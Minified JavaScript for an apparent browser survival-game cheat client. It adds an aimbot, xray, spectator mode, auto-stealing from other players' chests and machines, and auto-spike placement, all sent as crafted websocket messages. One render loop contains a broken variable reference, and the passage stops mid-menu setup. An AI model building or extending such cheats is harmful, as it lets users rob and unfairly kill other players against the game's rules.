function initScript() {
    document.head.insertAdjacentHTML("beforeend", "<link href=\"https://fonts.googleapis.com/css2?family=Shantell+Sans:ital,wght@1,700&display=swap\" rel=\"stylesheet\">");
    let e = performance.now();
    let i = [];
    trevda.remove();
    let t = new class {
      constructor() {
        this.ally = [];
        this.timeouts = [Date.now(), Date.now()];
        this.createText = (e, i, t, r, n, a = 0, o = true) => {
          D.save();
          D.beginPath();
          D.rotate(a);
          let s = D.measureText(e);
          D.font = n + "px Baloo Paaji";
          D.strokeStyle = "black";
          D.lineWidth = 7;
          D.fillStyle = i;
          D.strokeText(e, t - (o ? s.width : 0), r);
          D.fillText(e, t - (o ? s.width : 0), r);
          D.restore();
        };
        this.isAlly = e => this.ally.includes(e);
        this.getOwner = e => s_.players[e];
        this.renderName = (e, i = 0, t = 0) => {
          let r = this.getOwner(e.pid);
          let n = r.nickname;
          let a = r.level;
          D.save();
          D.font = "20px Baloo Paaji";
          D.lineWidth = 7;
          D.fillStyle = "#F9E8A2";
          D.strokeStyle = "black";
          let o = D.measureText(n);
          let s = D.measureText("[" + a + "]");
          D.strokeText("[" + a + "]", e.x + __.cam.x + o.width / 2 + s.width / 2 + i, e.y + __.cam.y + t);
          D.fillText("[" + a + "]", e.x + __.cam.x + o.width / 2 + s.width / 2 + i, e.y + __.cam.y + t);
          D.fillStyle = "white";
          D.strokeText(n, e.x + __.cam.x + i - o.width / 2, e.y + __.cam.y + t);
          D.fillText(n, e.x + __.cam.x + i - o.width / 2, e.y + __.cam.y + t);
          D.restore();
        };
        this.getDifference = (e, i) => Math.sqrt((e - i) ** 2);
        this.addSprite = e => {
          sprite[e] = [];
          sprite[e][Ie.DAY] = IMAGES[e];
          sprite[e][Ie.NIGHT] = IMAGES[e];
        };
        this.weaponRange = e => {
          switch (e) {
            case le.SWORD:
            case le.SWORD_WOOD:
            case le.SWORD_GOLD:
            case le.SWORD_DIAMOND:
            case le.SWORD_AMETHYST:
            case le.REIDITE_SWORD:
            case le.DRAGON_SWORD:
            case le.LAVA_SWORD:
            case le.SUPER_HAMMER:
            case le.HAMMER_REIDITE:
              return 150;
            case le.PIRATE_SWORD:
              return 175;
            case le.SPEAR:
            case le.WOOD_SPEAR:
            case le.GOLD_SPEAR:
            case le.DIAMOND_SPEAR:
            case le.AMETHYST_SPEAR:
            case le.REIDITE_SPEAR:
            case le.DRAGON_SPEAR:
            case le.LAVA_SPEAR:
              return 205;
            default:
              return 0;
          }
        };
        this.weaponRange_ = e => {
          switch (e) {
            case -1:
              return 100;
            case le.SWORD:
            case le.SWORD_WOOD:
            case le.SWORD_GOLD:
            case le.SWORD_DIAMOND:
            case le.SWORD_AMETHYST:
            case le.REIDITE_SWORD:
            case le.DRAGON_SWORD:
            case le.LAVA_SWORD:
              return 150;
            case le.PIRATE_SWORD:
              return 175;
            case le.SPEAR:
            case le.WOOD_SPEAR:
            case le.GOLD_SPEAR:
            case le.DIAMOND_SPEAR:
            case le.AMETHYST_SPEAR:
            case le.REIDITE_SPEAR:
            case le.DRAGON_SPEAR:
            case le.LAVA_SPEAR:
              return 215;
            default:
              return 150;
          }
        };
        this.getDamage = e => {
          switch (e) {
            case le.PICK_WOOD:
            case le.WOOD_SHIELD:
            case le.WATERING_CAN:
            case le.BOOK:
            case le.SADDLE:
              return 1;
            case le.SHOVEL:
            case le.HAMMER:
            case le.SPANNER:
            case le.PICK:
            case le.STONE_SHIELD:
              return 2;
            case le.SHOVEL_GOLD:
            case le.HAMMER_GOLD:
            case le.PICK_GOLD:
            case le.GOLD_SHIELD:
              return 3;
            case le.SHOVEL_DIAMOND:
            case le.HAMMER_DIAMOND:
            case le.PICK_DIAMOND:
            case le.DIAMOND_SHIELD:
              return 4;
            case le.SHOVEL_AMETHYST:
            case le.HAMMER_AMETHYST:
            case le.PICK_AMETHYST:
            case le.AMETHYST_SHIELD:
            case le.MACHETE:
            case le.HAND:
            case -1:
              return 5;
            case le.PICK_REIDITE:
            case le.HAMMER_REIDITE:
            case le.REIDITE_SHIELD:
              return 6;
            case le.WOOD_SPEAR:
              return 10;
            case le.SUPER_HAMMER:
            case le.SWORD_WOOD:
              return 12;
            case le.SPEAR:
            case le.CRAB_SPEAR:
              return 14;
            case le.GOLD_SPEAR:
              return 15;
            case le.DIAMOND_SPEAR:
              return 17;
            case le.AMETHYST_SPEAR:
            case le.SWORD:
              return 19;
            case le.DRAGON_SPEAR:
            case le.REIDITE_SPEAR:
            case le.SWORD_GOLD:
              return 22;
            case le.SWORD_DIAMOND:
            case le.PIRATE_SWORD:
            case le.LAVA_SPEAR:
              return 24;
            case le.SWORD_AMETHYST:
              return 27;
            case le.REIDITE_SWORD:
            case le.DRAGON_SWORD:
              return 30;
            case le.LAVA_SWORD:
              return 33;
          }
        };
        this.getHealth = (e, i) => {
          switch (e) {
            case us.CRATE:
              return 30;
            case us.RABBIT:
              return 60;
            case us.PENGUIN:
              return 90;
            case us.SPIDER:
              return 120;
            case us.TREASURE_CHEST:
              return 200;
            case us.CRAB:
              return 240;
            case us.HAWK:
              return 250;
            case us.BABY_MAMMOTH:
              return 1000;
            case us.KRAKEN:
              return 6000;
            case us.DEAD_BOX:
              if (i >= 49 && i <= 69) {
                return 36;
              } else {
                return 300;
              }
            case us.WOLF:
            case us.PIRANHA:
            case us.FOX:
              return 300;
            case us.BOAR:
            case us.FLAME:
            case us.VULTURE:
              return 600;
            case us.BEAR:
            case us.BABY_DRAGON:
              return 900;
            case us.MAMMOTH:
            case us.LAVA_DRAGON:
              return 3000;
            case us.DRAGON:
            case us.BABY_LAVA:
            case us.CRAB_BOSS:
            case us.SAND_WORM:
              return 1500;
            default:
              return 0;
          }
        };
        this.getDist = (e, i) => Math.sqrt((e.x - i.x) ** 2 + (e.y - i.y) ** 2);
        this.getNearest = (e, i = []) => {
          let t = {
            distance: 9999999,
            entity: null
          };
          for (let r = 0; r < i.length; r++) {
            let n = i[r];
            let a = this.getDist(e, i[r]);
            if (t.distance > a) {
              t.distance = a;
              t.entity = n;
            }
          }
          return t;
        };
        this.getAttackers = (e, i = []) => {
          let t = [];
          for (let r = 0; r < i.length; r++) {
            if (i[r].action & Es.ATTACK) {
              if (!(this.getDifference(Math.atan2(e.y - i[r].y, e.x - i[r].x), i[r].angle) >= 0.8 && this.getDist(e, i[r]) > this.weaponRange_(i[r].right))) {
                t.push(i[r]);
              }
            }
          }
          return t;
        };
        this.findTarget = (e = []) => {
          let i = s_.fast_units[__.uid];
          let t = {
            distance: 9999999,
            entity: null
          };
          for (let r = 0; r < e.length; r++) {
            if (this.isAlly(e[r].pid)) {
              continue;
            }
            let n = e[r];
            let a = this.getDist(i, e[r]);
            if (t.distance > a) {
              t.distance = a;
              t.entity = n;
            }
          }
          return t;
        };
        this.inventoryHas = e => __.inv.can_select.find(i => i.id === e) != null;
        this.rejoin = () => {
          __.alive = false;
          client.new_alert("Respawn");
          if (client._current_id == client.socket._current_id) {
            client._current_id++;
            client.socket.close();
            client.connect();
          }
        };
        this.addHack = (e, i) => {
          if (e) {
            if (!r.enableHacks.includes(i)) {
              r.enableHacks.push(i);
            }
          } else if (r.enableHacks.includes(i)) {
            r.enableHacks.splice(r.enableHacks.findIndex(e => e == i));
          }
        };
        this.setChangelog = e => {
          let i = e.split("||");
          for (let e = 0; e < i.length; e += 1) {
            let t = i[e];
            let r = "#0075e2";
            try {
              JSON.parse(t[0]);
            } catch (e) {
              r = "white";
            }
            this.createText(t, r, window.innerWidth - 190, 170 + e * 25, 18);
          }
        };
        this.cleverInterval = () => {
          requestAnimationFrame(this.cleverInterval);
          if (!__) {
            return;
          }
          this.addHack(r.visuals.xray.all, "Xray");
          this.addHack(r.main.misc.weaponinchest.enable, "WeaponInChest");
          this.addHack(r.main.misc.dropweapon.enable, "DropWeapon");
          this.addHack(r.main.autospike.enable, "AutoSpike");
          this.addHack(r.main.autosteal.enable, "AutoSteal");
          this.addHack(r.main.processing.autocraft.enable, "AutoCraft");
          this.addHack(r.main.processing.autorecycle.enable, "AutoRecycle");
          this.addHack(r.main.take.extractor, "ExtractorTake");
          this.addHack(r.main.take.windmill, "WindmillTake");
          this.addHack(r.main.take.oven, "OvenTake");
          this.addHack(r.main.put.extractor, "ExtractorPut");
          this.addHack(r.main.put.windmill, "WindmillPut");
          this.addHack(r.main.put.oven, "OvenPut");
          this.addHack(r.main.misc.autototem.enable, "AutoTotem");
          this.addHack(r.main.aimbot.player, "Aimbot");
          this.addHack(r.main.aimbot.animal, "AnimalAimbot");
          if (!__.alive) {
            D.save();
            D.fillStyle = "black";
            D.globalAlpha = 0.6;
            D.fillRect(window.innerWidth - 370, 100, 350, 600);
            D.restore();
            this.createText("Changelog", "red", window.innerWidth - 200, 130, 23);
            this.setChangelog("09.04.2023||DM me Askile#5430 if u use this script||06.03.2023||Join&Death||New menu's font||PlayerInfo||Levels in leaderboard||BugFixes||20.02.2023||DeathMarker||TotemMarker||PlayersOnMap||TotemOnTop||DropWeapon||Vehicle Xray||19.02.2023||Autofeed/Autobottle||Cosmetic changes||Fixed colorspike lags||Fixed ExtTake||Fixed AutoCrown");
          }
          if (!__.alive) {
            return;
          }
          const n = performance.now();
          for (; i.length > 0 && i[0] <= n - 1000;) {
            i.shift();
          }
          i.push(n);
          if (Date.now() - e >= 1000) {
            e = Date.now();
            r.visuals.gauges.fps.count = i.length - 1;
          }
          this.ally = __.team.length > 0 ? __.team : [__.id];
          let a = s_.fast_units[__.uid];
          let o = s_.units[us.CHEST];
          let s = s_.units[us.FIRE];
          let _ = s_.units[us.BIG_FIRE];
          let E = s_.units[us.BREAD_OVEN];
          let T = s_.units[us.WINDMILL];
          let A = s_.units[us.EMERALD_MACHINE];
          let d = s_.units[us.TOTEM];
          let h = s_.units[us.RESURRECTION];
          for (let e = 0; e < d.length; e++) {
            const i = d[e];
            if (this.isAlly(i.pid)) {
              r.visuals.map.totem.x = i.x;
              r.visuals.map.totem.y = i.y;
            }
          }
          if (r.visuals.info.joindeath.enable) {
            for (let e = 0; e < r.visuals.info.joindeath.join.length; e++) {
              const i = r.visuals.info.joindeath.join[e];
              const n = sprite[Ie.BODY][i.skin][s_.time];
              const a = sprite[Ie.ACCESSORY][i.accessory][s_.time];
              D.save();
              Nn(D, n, -(n.width > 50 ? n.width / 8 : 0), 330 + (e - 1) * 25, Math.min(50, n.width / 4), n.height / 4);
              Nn(D, a, 0, 330 + (e - 1) * 25, Math.min(50, a.width / 4), a.height / 4);
              D.restore();
              t.createText(i.nickname + "|" + i.level, "green", 50, 330 + e * 25, 20, undefined, false);
            }
            for (let e = 0; e < r.visuals.info.joindeath.dead.length; e++) {
              const i = r.visuals.info.joindeath.dead[e];
              const n = sprite[Ie.BODY][i.skin][s_.time];
              const a = sprite[Ie.ACCESSORY][i.accessory][s_.time];
              D.save();
              Nn(D, n, -(n.width > 50 ? n.width / 8 : 0), 470 + (e - 1) * 25, n.width / 4, n.height / 4);
              Nn(D, a, 0, 470 + (e - 1) * 25, Math.min(50, a.width / 4), a.height / 4);
              D.restore();
              t.createText(i.nickname + "|" + i.level, "red", 50, 470 + e * 25, 20, undefined, false);
            }
          }
          if (r.visuals.info.totem) {
            for (let e = 0; e < d.length; e++) {
              const i = d[e];
              t.renderName(i, 0, 25);
              t.createText(i.info >= 16 ? "🤵" + i.info % 16 : "🤵" + i.info, "white", i.x + __.cam.x, i.y + __.cam.y - 25, 20);
              t.createText(i.info >= 16 ? "🔒" : "🔓", "white", i.x + __.cam.x, i.y + __.cam.y, 20);
            }
          }
          if (r.visuals.info.entityhp) {
            for (let e = 0; e < s_.units.length; e++) {
              if (typeof s_.units[e] == "object") {
                const i = s_.units[e];
                for (let e = 0; j < i.length; e++) {
                  const e = i[j];
                  let t = e.health - e.damaged;
                  if (t <= 0) {
                    return;
                  }
                  this.createText("❤️" + t, "red", e.x + __.cam.x, e.y + __.cam.y + 8, 20);
                }
              }
            }
          }
          if (r.visuals.info.playerinfo.enable) {
            let e = s_.units[us.PLAYERS];
            for (let i = 0; i < e.length; i++) {
              const t = e[i];
              this.createText("Limit:" + r.visuals.info.playerinfo.l[t.pid], "#5f57ff", t.x + __.cam.x, t.y + __.cam.y + 55, 20);
              this.createText("Score:" + s_.players[t.pid].score, "#5f57ff", t.x + __.cam.x, t.y + __.cam.y + 75, 20);
            }
          }
          if (r.visuals.info.extractor) {
            for (let e = us.EXTRACTOR_MACHINE_STONE; e < us.EXTRACTOR_MACHINE_REIDITE + 1; e++) {
              let i = s_.units[e];
              for (let e = 0; e < i.length; e++) {
                const r = i[e];
                t.createText((r.info & 255) + "x", "white", r.x + __.cam.x, r.y + __.cam.y - 10, 20);
                t.createText(((r.info & 65280) >> 8) + "x", "white", r.x + __.cam.x, r.y + __.cam.y + 10, 20);
              }
            }
          }
          if (r.visuals.info.windmill) {
            for (let e = 0; e < T.length; e++) {
              const i = T[e];
              t.createText((i.info & 255) + "x", "white", i.x + __.cam.x, i.y + __.cam.y - 5, 20);
              t.createText(((i.info & 65280) >> 8) + "x", "white", i.x + __.cam.x, i.y + __.cam.y + 15, 20);
            }
          }
          if (r.visuals.info.fire) {
            for (let e = 0; e < s.length; e++) {
              const i = s[e];
              t.renderName(i, 0, -10);
              t.createText((120 - (Date.now() - i.time) / 1000).toFixed(1) + "s", "white", i.x + __.cam.x, i.y + __.cam.y + 10, 20);
            }
            for (let e = 0; e < _.length; e++) {
              const i = _[e];
              t.renderName(i, 0, -10);
              t.createText((300 - (Date.now() - i.time) / 1000).toFixed(1) + "s", "white", i.x + __.cam.x, i.y + __.cam.y + 10, 20);
            }
          }
          for (let e = 0; e < A.length; e++) {
            const i = A[e];
            t.renderName(i, 0, 10);
          }
          if (Date.now() - this.timeouts[0] > 500) {
            this.timeouts[0] = Date.now();
            if (r.main.misc.autoice && __.gauges.wa <= 0.99) {
              client.socket.send(JSON.stringify([5, le.ICE]));
            }
            if (r.main.misc.ecoice && __.gauges.wa == 0) {
              client.socket.send(JSON.stringify([5, le.ICE]));
            }
            if (__.gauges.h <= 0.35) {
              let e = this.inventoryHas(le.PLANT) ? le.PLANT : this.inventoryHas(le.TOMATO) ? le.TOMATO : this.inventoryHas(le.MELON) ? le.MELON : this.inventoryHas(le.PUMPKIN) ? le.PUMPKIN : this.inventoryHas(le.CARROT) ? le.CARROT : this.inventoryHas(le.CAKE) ? le.CAKE : this.inventoryHas(le.SANDWICH) ? le.SANDWICH : this.inventoryHas(le.COOKIE) ? le.COOKIE : this.inventoryHas(le.BREAD) ? le.BREAD : le.PLANT;
              client.socket.send(JSON.stringify([5, e]));
            }
            if (__.gauges.t <= 0.35) {
              client.socket.send(JSON.stringify([5, le.BOTTLE_FULL]));
            }
          }
          if (Date.now() - this.timeouts[1] > 1000 / 15) {
            this.timeouts[1] = Date.now();
            if (r.main.processing.autocraft.enable && __.craft.can_craft.find(e => e.id === r.main.processing.autocraft.id) != null && !__.crafting) {
              client.select_craft(r.main.processing.autocraft.id);
            }
            if (r.main.processing.autorecycle.enable && __.craft.workbench && !__.crafting) {
              client.recycle_inv(r.main.processing.autorecycle.id);
            }
            if (r.main.misc.autocrown) {
              let e = this.getNearest(a, h);
              if (e.distance <= 250 && __.ghost.enabled) {
                client.socket.send(JSON.stringify([17, e.entity.pid, e.entity.id]));
                setTimeout(() => {
                  client.socket.send(JSON.stringify([5, le.CROWN_BLUE]));
                  client.socket.send(JSON.stringify([5, le.HAMMER_REIDITE]));
                }, 10);
              }
            }
            if (r.main.misc.weaponinchest.enable && this.weaponRange(a.right) != 0) {
              let e = this.getNearest(a, o);
              if (e.distance >= 250) {
                client.socket.send(JSON.stringify([10, le.CHEST, Math.floor(Math.random() * 256), 0]));
              }
              if (e.entity != null) {
                e = e.entity;
                if (this.getDist(a, e) <= 250) {
                  e.iid = e.id;
                  client.give_item(e, a.right, 100);
                  client.take_chest(e);
                }
              }
            }
            if (r.main.misc.dropweapon.enable && this.weaponRange(a.right) != 0) {
              client.delete_inv(a.right);
            }
            if (r.main.misc.autototem.enable) {
              for (let e = 0; e < d.length; e++) {
                const i = d[e];
                if (this.getDist(a, i) < 330) {
                  client.socket.send(JSON.stringify([18, i.pid, i.id]));
                }
              }
            }
            if (r.main.autosteal.enable) {
              for (let e = 0; e < o.length; e++) {
                const i = o[e];
                if (this.getDist(a, i) < 330) {
                  i.iid = i.id;
                  client.take_chest(i);
                }
              }
              for (let e = 0; e < E.length; e++) {
                const i = E[e];
                if (this.getDist(a, i) < 330) {
                  i.iid = i.id;
                  client.take_bread(i);
                }
              }
              for (let e = 0; e < T.length; e++) {
                const i = T[e];
                if (this.getDist(a, i) < 330) {
                  i.iid = i.id;
                  client.take_flour(i);
                }
              }
              for (let e = us.EXTRACTOR_MACHINE_STONE; e < us.EXTRACTOR_MACHINE_REIDITE + 1; e++) {
                let i = s_.units[e];
                for (let e = 0; e < i.length; e++) {
                  const t = i[e];
                  if (this.getDist(a, t) < 330) {
                    t.iid = t.id;
                    client.take_extractor(t);
                  }
                }
              }
            }
            if (r.main.take.extractor) {
              for (let e = us.EXTRACTOR_MACHINE_STONE; e < us.EXTRACTOR_MACHINE_REIDITE + 1; e++) {
                let i = s_.units[e];
                for (let e = 0; e < i.length; e++) {
                  const t = i[e];
                  if (this.getDist(a, t) < 330) {
                    t.iid = t.id;
                    client.take_extractor(t);
                  }
                }
              }
            }
            if (r.main.take.oven) {
              for (let e = 0; e < E.length; e++) {
                const i = E[e];
                if (this.getDist(a, i) < 330) {
                  i.iid = i.id;
                  client.take_bread(i);
                }
              }
            }
            if (r.main.take.windmill) {
              for (let e = 0; e < T.length; e++) {
                const i = T[e];
                if (this.getDist(a, i) < 330) {
                  i.iid = i.id;
                  client.take_flour(i);
                }
              }
            }
          }
          if (r.main.put.extractor) {
            for (let e = us.EXTRACTOR_MACHINE_STONE; e < us.EXTRACTOR_MACHINE_REIDITE + 1; e++) {
              let i = s_.units[e];
              for (let e = 0; e < i.length; e++) {
                const t = i[e];
                if (this.getDist(a, t) < 330) {
                  t.iid = t.id;
                  client.give_wood_extractor(t, 10);
                }
              }
            }
          }
          if (r.main.put.oven) {
            E.forEach(e => {
              if (this.getDist(a, e) < 330) {
                e.iid = e.id;
                client.give_bread_oven(e, 10);
              }
            });
          }
          if (r.main.put.windmill) {
            T.forEach(e => {
              if (this.getDist(a, e) < 330) {
                e.iid = e.id;
                client.give_wheat(e, 10);
              }
            });
          }
          if (r.main.autospike.enable) {
            let e = Math.floor((a.angle + Math.PI * 2) % (Math.PI * 2) * 255 / (Math.PI * 2));
            let i = 0;
            r.main.autospike.spikes.forEach(e => this.inventoryHas(e) ? i = e : null);
            if (i != 0) {
              for (let t = 0; t < 30; t++) {
                client.socket.send(JSON.stringify([10, i, (e - t + 255) % 255, 0]));
              }
            }
          }
        };
      }
    }();
    setTimeout(t.cleverInterval, 2500);
    let r = {
      enableHacks: [],
      visuals: {
        gauges: {
          default: true,
          extra: true,
          weather: true,
          day: true,
          fps: {
            count: 60,
            enable: true
          },
          healtimer: 10,
          timer: 5
        },
        renderAtTop: {
          players: true,
          boxes: true,
          chests: true,
          totems: true
        },
        xray: {
          opacity: 0.7,
          roof: true,
          vehicle: true,
          all: false,
          bind: "KeyX"
        },
        info: {
          coloredspike: false,
          totem: false,
          chest: false,
          box: false,
          fire: false,
          oven: false,
          windmill: false,
          extractor: false,
          entityhp: false,
          joindeath: {
            enable: false,
            dead: [],
            join: []
          },
          playerinfo: {
            enable: false,
            l: {}
          }
        },
        map: {
          death: {
            enable: true,
            x: -1,
            y: -1
          },
          totem: {
            enable: true,
            x: -1,
            y: -1
          },
          players: true
        },
        spectator: {
          enable: false,
          speed: 60,
          bind: "KeyP"
        }
      },
      main: {
        aimbot: {
          animal: false,
          player: false,
          bind: "KeyF",
          bind_: "KeyJ"
        },
        autospike: {
          spikes: [156, 154, 162, 163, 164, 117, 213],
          enable: false,
          bind: "Space"
        },
        take: {
          extractor: false,
          oven: false,
          windmill: false
        },
        put: {
          extractor: false,
          oven: false,
          windmill: false
        },
        autosteal: {
          enable: false,
          bind: "KeyQ"
        },
        processing: {
          autocraft: {
            id: 0,
            enable: false,
            bind: "KeyK"
          },
          autorecycle: {
            id: 0,
            enable: false,
            bind: "KeyL"
          }
        },
        misc: {
          autoice: false,
          ecoice: false,
          autocrown: false,
          autototem: {
            enable: false,
            bind: "KeyH"
          },
          dropweapon: {
            enable: false,
            bind: "KeyV"
          },
          weaponinchest: {
            enable: false,
            bind: "KeyE"
          }
        }
      }
    };
    window.clearSettings = () => {
      r = null;
      localStorage.removeItem("settings");
    };
    setTimeout(function () {
      if (JSON.parse(localStorage.getItem("settings")) !== null) {
        r = JSON.parse(localStorage.getItem("settings"));
      }
      if (!JSON.stringify(r).includes("joindeath")) {
        window.alert("Reset page");
        window.clearSettings();
      }
      class e {
        constructor(e) {
          this.Button = e.code;
          this.chatEnabled = document.getElementById("chat_block").style.display == "inline-block";
        }
        keyDown() {
          if (!this.chatEnabled) {
            switch (this.Button) {
              case r.main.processing.autocraft.bind:
                r.main.processing.autocraft.enable = !r.main.processing.autocraft.enable;
                break;
              case r.main.processing.autorecycle.bind:
                r.main.processing.autorecycle.enable = !r.main.processing.autorecycle.enable;
                break;
              case r.main.aimbot.bind:
                r.main.aimbot.player = !r.main.aimbot.player;
                if (!r.main.aimbot.player) {
                  client.stop_attack();
                }
                break;
              case r.main.aimbot.bind_:
                r.main.aimbot.animal = !r.main.aimbot.animal;
                if (!r.main.aimbot.animal) {
                  client.stop_attack();
                }
                break;
              case r.visuals.xray.bind:
                r.visuals.xray.all = !r.visuals.xray.all;
                break;
              case r.visuals.spectator.bind:
                r.visuals.spectator.enable = !r.visuals.spectator.enable;
                if (!r.visuals.spectator.enable) {
                  client.socket.send(JSON.stringify([11]));
                }
                break;
              case r.main.misc.autototem.bind:
                r.main.misc.autototem.enable = !r.main.misc.autototem.enable;
                break;
              case r.main.misc.weaponinchest.bind:
                r.main.misc.weaponinchest.enable = true;
                break;
              case r.main.misc.dropweapon.bind:
                r.main.misc.dropweapon.enable = true;
                break;
              case r.main.autosteal.bind:
                r.main.autosteal.enable = true;
                break;
              case r.main.autospike.bind:
                r.main.autospike.enable = true;
            }
          }
        }
        keyUp() {
          if (!this.chatEnabled) {
            switch (this.Button) {
              case r.main.autosteal.bind:
                r.main.autosteal.enable = false;
                break;
              case r.main.autospike.bind:
                r.main.autospike.enable = false;
                break;
              case r.main.misc.dropweapon.bind:
                r.main.misc.dropweapon.enable = false;
                break;
              case r.main.misc.weaponinchest.bind:
                r.main.misc.weaponinchest.enable = false;
            }
          }
        }
      }
      document.addEventListener("keydown", i => new e(i).keyDown());
      document.addEventListener("keyup", i => new e(i).keyUp());
      window.addEventListener("beforeunload", () => localStorage.setItem("settings", JSON.stringify(r)));
      setTimeout(function e() {
        requestAnimationFrame(e);
        const i = game_canvas.getContext("2d");
        let t = 20;
        r.enableHacks.forEach(e => {
          !function (e, i, t, r, n, a) {
            e.save();
            e.font = `${t}px Baloo Paaji`;
            e.fillStyle = r;
            e.strokeStyle = "black";
            e.lineWidth = 7;
            e.strokeText(i, n, a);
            e.fillText(i, n, a);
            e.restore();
          }(i, e, 20, "red", 0, t);
          t += 20;
        });
      }, 0);
      const i = (e, i) => {
        e[i] = "Press Any Key";
        document.addEventListener("keydown", function t(r) {
          e[i] = r.code;
          document.removeEventListener("keydown", t);
        });
      };
      !function () {
        let e = document.createElement("script");
        e.onload = function () {
          let e = new guify({
            title: "🍀",
            theme: {
              name: "name",
              colors: {
                panelBackground: "rgb(0,0,0)",
                componentBackground: "rgb(3, 16, 34)",
                componentForeground: "#007182",
                textPrimary: "#0075e2",
                textSecondary: "#ffffff",
                textHover: "#0075e2"
              },
              font: {
                fontFamily: "Shantell Sans",
                fontSize: "20px",
                fontWeight: "1"
              }
            },
            align: "right",
            width: "35%",
            barMode: "none",
            panelMode: "none",
            opacity: 0.75,
            open: false
          });
          e.Register({
            type: "folder",
            label: "Visuals",
            open: false
          });
          e.Register({
            type: "folder",
            label: "Main",
            open: false
          });
          e.Register({
            type: "folder",
            label: "Binds",
            open: false
          });
          e.Register([{
            type: "folder",
            label: "Gauges",
            open: false
          }, {
            type: "folder",
            label: "RenderAtTop",
            open: false
          }, {
            type: "folder",
            label: "Xray",
            open: false
          }, {
            type: "folder",
            label: "Info",
            open: false
          }, {
            type: "folder",
            label: "Map",
            open: false
          }, {
            type: "folder",
            label: "Camera",
            open: false
          }], {
            folder: "Visuals"
          });
          e.Register([{
            type: "checkbox",
            label: "Numbers",
            object: r.visuals.gauges,
            property: "default",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Percents",
            object: r.visuals.gauges,
            property: "extra",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Weather",
            object: r.visuals.gauges,
            property: "weather",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Fps",
            object: r.visuals.gauges.fps,
            property: "enable",
            onChange: e => {}
          }], {
            folder: "Gauges"
          });
          e.Register([{
            type: "checkbox",
            label: "Players",
            object: r.visuals.renderAtTop,
            property: "players",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Boxes",
            object: r.visuals.renderAtTop,
            property: "boxes",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Chests",
            object: r.visuals.renderAtTop,
            property: "chests",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Totems",
            object: r.visuals.renderAtTop,
            property: "totems",
            onChange: e => {}
          }], {
            folder: "RenderAtTop"
          });
          e.Register([{
            type: "range",
            label: "Opacity",
            min: 0.1,
            max: 1,
            step: 0.05,
            object: r.visuals.xray,
            property: "opacity",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Vehicle",
            object: r.visuals.xray,
            property: "vehicle",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Roof",
            object: r.visuals.xray,
            property: "roof",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "All",
            object: r.visuals.xray,
            property: "all",
            onChange: e => {}
          }, {
            type: "display",
            label: "Xray Key:",
            object: r.visuals.xray,
            property: "bind"
          }, {
            type: "button",
            label: "Set Xray Key",
            action: e => {
              i(r.visuals.xray, "bind");
            }
          }], {
            folder: "Xray"
          });
          e.Register([{
            type: "checkbox",
            label: "ColorSpikes",
            object: r.visuals.info,
            property: "coloredspike",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Totem",
            object: r.visuals.info,
            property: "totem",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Chest",
            object: r.visuals.info,
            property: "chest",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Box",
            object: r.visuals.info,
            property: "box",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Fire",
            object: r.visuals.info,
            property: "fire",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Oven",
            object: r.visuals.info,
            property: "oven",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Windmill",
            object: r.visuals.info,
            property: "windmill",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Extractor",
            object: r.visuals.info,
            property: "extractor",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "EntityHp",
            object: r.visuals.info,
            property: "entityhp",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "PlayerInfo",
            object: r.visuals.info.playerinfo,
            property: "enable",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Join & Deaths",
            object: r.visuals.info.joindeath,
            property: "enable",
            onChange: e => {}
          }], {
            folder: "Info"
          });
          e.Register([{
            type: "checkbox",
            label: "LastDeath",
            object: r.visuals.map.death,
            property: "enable",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Totem",
            object: r.visuals.map.totem,
            property: "enable",
            onChange: e => {}
          }, {
            type: "checkbox",
            label: "Players",
            object: r.visuals.map,
            property: "players",
            onChange: e => {}
          }], {
            folder: "Map"
          });
          e.Register([{
            type: "checkbox",
            label: "Spectator",
            object: r.visuals.spectator,
            property: "enable",
            onChange: e => {
              if (!r.visuals.spectator.enable) {
                client.socket.send(JSON.stringify([11]));
              }
            }
          }, {
            type: "display",
            label: "Spectator Key:",
            object: r.visuals.spectator,
            property: "bind"
          }, {
            type: "button",
            label: "Set Spectator Key",
            action: e => {
              i(r.visuals.spectator, "bind");
            }
          }, {
            type: "range",
            label: "Speed",
            min: 10,
            max: 100,
            step: 5,
            object: r.visuals.spectator,
            property: "speed",
            onChange: e => {}
          }], {
            folder: "Camera"
          });
          e.Register([{
            type: "folder",
            label: "Processing",
            open: false
          }, {
            type: "folder",
            label: "Aimbot",
            open: false
          }, {
            type: "folder",
            label: "Auto Spike",
            open: false
          }, {
            type: "folder",
            label: "Auto Steal",
            open: false
          }, {
            type: "folder",
            label: "AutoPut",
            open: false
          }, {
            type: "folder",
            label: "AutoTake",
            open: false
          }, {
            type: "folder",
            label: "TokenJoiner",
            open: false
          }, {
            type: "folder",
            label: "Misc",
            open: false
          }], {
            folder: "Main"
          });
          e.Register([{
            type: "checkbox",
            label: "Animal",
            object: r.main.aimbot,
            property: "animal",
            onChange: e => {
              if (!r.main.aimbot.animal) {
                client.stop_attack();
              }
            }
          }, {
            type: "checkbox",
            label: "Player",
            object: r.main.aimbot,
            property: "player",
            onChange: e => {
              if (!r.main.aimbot.player) {
                client.stop_attack();
              }
            }
          }, {
            type: "display",
            label: "Aimbot Key:",
            object: r.main.aimbot,
            property: "bind"
          }, {
            type: "button",
            label: "Set Aimbot Key",
            action: e => {
              i(r.main.aimbot, "bind");
            }
          }, {
            type: "display",
            label: "AnimalAimbot Key:",
            object: r.main.aimbot,
            property: "bind_"
          }, {
            type: "button",
            label: "Set AnimalAimbot Key",
            action: e => {
              i(r.main.aimbot, "bind_");
            }
